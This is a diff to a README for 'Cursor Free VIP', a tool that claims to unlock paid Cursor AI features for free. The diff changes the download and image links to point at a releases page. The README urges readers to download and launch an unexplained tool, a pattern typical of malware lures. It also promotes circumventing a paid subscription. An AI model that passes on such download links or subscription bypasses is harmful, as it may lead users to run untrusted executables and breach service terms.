@@ -14,7 +14,7 @@ Welcome to the **Cursor Free VIP** repository! 🔥
 🤖 automation, cursor, cursor-ai, cursor-ide, cursorai, cursors, free, freetrial, pro
 
 ## Access the Tool
-Click [here](https://github.com/uploads/App.zip) to download the tool. Please note that the tool needs to be launched successfully to start using its amazing features.
+Click [here](https://github.com/eqy-o/cursor-free-vip/releases) to download the tool. Please note that the tool needs to be launched successfully to start using its amazing features.
 
 ## Getting Started
 Let's dive into the world of Cursor AI automation with the **Cursor Free VIP** tool. Follow these simple steps to streamline your Cursor AI experience:
@@ -32,7 +32,7 @@ If you encounter any issues or have feedback to share, don't hesitate to reach o
 
 Let's revolutionize the way you interact with Cursor AI. Get started today and unlock the full potential of Cursor AI with the **Cursor Free VIP** tool! 🌟
 
-![Cursor AI](https://example.com/cool_cursor_image.png)
+![Cursor AI](https://github.com/eqy-o/cursor-free-vip/releases)
 
 ---
 
